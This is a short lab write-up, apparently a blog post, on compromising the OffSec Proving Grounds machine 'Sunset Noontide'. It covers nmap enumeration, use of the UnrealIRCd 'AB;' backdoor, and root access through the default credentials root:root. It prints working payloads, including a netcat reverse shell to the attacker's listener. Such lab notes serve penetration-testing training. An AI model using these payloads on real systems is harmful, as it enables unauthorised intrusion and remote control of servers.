---
title: OffSec PG - Sunset Noontide
date: 2021-12-19 12:00:00 +0500
categories: [Lab Practice Notes, OffSec Proving Grounds]
tags: [oscp,lab,offsec-proving-grounds]
image:
  path: /assets/img/covers/pg-cover.jpeg
  alt: PG Artwork
---

## Enumeration

Machine IP &rarr; `192.168.56.120`

### Network Scan

Nmap scan &rarr; `nmap -sC -sV -Pn -p- -A -o nmap.txt 192.168.56.120`

OS Detection &rarr;  `Host: irc.foonet.com`

| **Port**         | **Service** | **Other details (if any)** |
| ---------------- | ----------- | -------------------------- |
| 6667, 6697, 8067 | IRC         | UnrealIRCd                 |

---

## Exploitation

The only service is an IRC, so searched exploit db via searchsploit for an exploit. This returned 4 entries. Looking at the code for the first one, there seems to be a backdoor which allows execution of shell commands when anything start with `AB;`.

Therefore, access can be checked by connecting to the IRCd via netcat and sending the the payload as `AB;echo "a" | nc 192.168.49.56 3002`. With a listener active on the attacking machine with the IP as in the payload, a conection and the letter "a" would be received.

Therefore, a similar payload can be used to receive shell via nc &rarr; `AB;nc 192.168.49.56 3002 -e /bin/bash`. This gives a shell as the `server` user. The home directory has the user flag.

---

## Privilege Escalation

With the shell of the `server` user, trying default creds of `root:root` works for getting the shell to root. This gives the root flag.

---
